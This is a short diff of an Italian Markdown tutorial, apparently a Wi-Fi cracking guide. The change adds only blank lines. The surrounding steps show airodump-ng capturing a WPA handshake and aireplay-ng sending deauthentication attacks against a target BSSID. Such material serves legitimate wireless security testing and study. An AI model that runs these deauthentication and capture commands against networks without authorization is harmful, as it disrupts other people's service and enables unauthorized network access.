@@ -19,8 +19,10 @@
 > $ airodump-ng <nome interfaccia>
 
 3. **Utilizzare Airodump-NG e Aireplay-NG per catturare l'handshake**
+
 Terminale 1 (Airodump):
 > $ airodump-ng -c <channel> --bssid <bssid> -w <nome-file> <nome interfaccia>
+  
 Terminale 2 (Aireplay):
 > $ aireplay-ng -0 <numero attacchi> -a <bssid> <nome interfaccia>
 
